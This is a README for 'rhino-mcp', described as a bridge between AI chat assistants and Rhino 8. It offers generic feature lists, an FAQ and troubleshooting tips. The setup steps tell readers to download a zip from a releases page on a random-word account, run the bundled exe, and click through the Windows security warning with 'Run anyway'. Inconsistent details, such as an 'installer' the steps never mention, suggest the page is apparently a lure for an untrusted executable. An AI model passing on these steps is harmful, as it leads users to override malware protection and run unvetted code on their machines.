# 🦏 rhino-mcp - Control Rhino 8 using your AI

[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Materialwitnessmauritianmonetaryunit241/rhino-mcp/releases)

Rhino-mcp connects your AI assistant to Rhino 8. It allows tools like Claude, ChatGPT, and Ollama to create and modify 3D geometry directly. This application handles the connection between your chat interface and your design software. It manages 32 specific commands, processes bulk data, and creates visual previews of your work.

## 📥 How to Set Up

Follow these steps to install the software on your Windows computer.

1. Visit the [releases page](https://github.com/Materialwitnessmauritianmonetaryunit241/rhino-mcp/releases) to find the latest version.
2. Look for the file ending in .zip under the Assets section.
3. Click the file name to start your download.
4. Open your Downloads folder once the file finishes saving.
5. Right-click the folder and select Extract All.
6. Open the extracted folder and double-click the file named rhino-mcp.exe.
7. Windows may show a security window. Click More Info and then select Run anyway.

## 🛠️ System Requirements

This application functions on standard hardware. Ensure your computer meets these conditions:

- Windows 10 or Windows 11.
- Rhino 8 installed and activated.
- At least 8GB of system memory.
- A stable internet connection for AI processing.
- A supported AI application like Claude, ChatGPT (Desktop) or Ollama.

## ⚙️ Connecting AI to Rhino

The application acts as a bridge. Use these steps after you start the program.

1. Ensure Rhino 8 is open.
2. Select your preferred AI platform in the application settings.
3. The application will generate a port number. Copy this number if your AI platform asks for a configuration address.
4. Paste the address into the MCP settings panel inside your AI assistant.
5. Test the connection by typing a command like "Draw a cube at coordinates 0,0,0" in your chat box.

## 📦 Key Features

The software includes tools to improve your workflow.

- Command library: Use 32 predefined actions to create lines, surfaces, and solids.
- Batch operations: Send multiple requests at once to speed up tasks.
- Visual feedback: The system saves auto-thumbnails of your work so you can see changes quickly.
- Efficiency: Data moves through gzip compression to keep interactions fast.
- Compatibility: The program supports local models through Ollama and web-based models like Claude or ChatGPT.

## 💡 Common Questions

### How do I stop the connection?
Close the main window of the rhino-mcp application. This stops the bridge immediately.

### Why does the icon stay in my taskbar?
The application runs in the background to listen for commands from your AI assistant. You can exit it by right-clicking the icon near your clock and selecting Quit.

### Does it work with older Rhino versions?
No. This tool requires the specific programming hooks available in Rhino 8.

### How do I update the software?
Check the releases page occasionally. Download the new version, extract it, and replace your old folder with the new one.

### Can I run this without an internet connection?
If you use Ollama, you can run the AI local to your machine. However, the MCP connection requires the host application to function properly.

## 📝 Usage Tips

- Be clear in your requests. Mention shapes and sizes to help the AI draw accurately.
- Use atomic batches for complex tasks. This method reduces errors during geometry generation.
- Check the thumbnail images if a command seems to finish without visuals in the viewport.
- Keep the Rhino file saved before you start a long AI session.

## 🔧 Troubleshooting

If you encounter issues, verify your setup with these diagnostic steps.

- Confirm the AI platform shows a green status icon next to the MCP link.
- Restart Rhino 8 and the rhino-mcp application if commands stop responding.
- Verify that your firewall allows the app to communicate locally.
- Review the log file located in the application folder if you see an error message.
- Re-run the installer if files appear missing or corrupted.